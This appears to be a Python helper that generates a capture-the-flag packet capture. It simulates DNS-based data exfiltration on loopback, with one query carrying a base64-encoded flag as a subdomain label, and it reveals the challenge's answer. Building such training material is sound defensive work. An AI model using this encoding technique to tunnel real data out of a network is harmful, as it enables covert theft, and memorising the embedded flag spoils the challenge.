"""One-off script for Challenge 10 pcap.
Simulates DNS-based data exfiltration by placing base64-encoded data in a
subdomain label. Run while capturing on loopback in Wireshark; save as
static/pcaps/challenge_10.pcapng.
"""

import socket
import struct
import threading
import time

HOST = "127.0.0.1"
PORT = 53535

# Base64 of NETWORK_EXFILTRATION_DETECTED without the trailing "=".
# "=" is not valid inside a DNS label, so the solver should add padding back.
EXFIL_LABEL = "TkVUV09SS19FWEZJTFRSQVRJT05fREVURUNURUQ"

DOMAINS = [
    "www.normal.local",
    "api.service.local",
    f"{EXFIL_LABEL}.exfil.local",
    "cdn.assets.local",
]


def encode_qname(name):
    parts = name.split(".")
    return b"".join(bytes([len(part)]) + part.encode() for part in parts) + b"\x00"


def build_query(domain, txid):
    header = struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0)
    question = encode_qname(domain) + struct.pack("!HH", 1, 1)  # A, IN
    return header + question


def build_response(query):
    txid = query[:2]
    flags = struct.pack("!H", 0x8183)  # Standard response, NXDOMAIN
    counts = struct.pack("!HHHH", 1, 0, 0, 0)
    question = query[12:]
    return txid + flags + counts + question


def dns_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((HOST, PORT))
    for _ in DOMAINS:
        data, addr = sock.recvfrom(512)
        sock.sendto(build_response(data), addr)
    sock.close()


def dns_client():
    time.sleep(0.2)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for txid, domain in enumerate(DOMAINS, start=1):
        packet = build_query(domain, txid)
        sock.sendto(packet, (HOST, PORT))
        try:
            sock.recvfrom(512)
        except OSError:
            pass
        time.sleep(0.1)
    sock.close()


def main():
    server_thread = threading.Thread(target=dns_server, daemon=True)
    server_thread.start()
    dns_client()
    time.sleep(0.2)


if __name__ == "__main__":
    main()
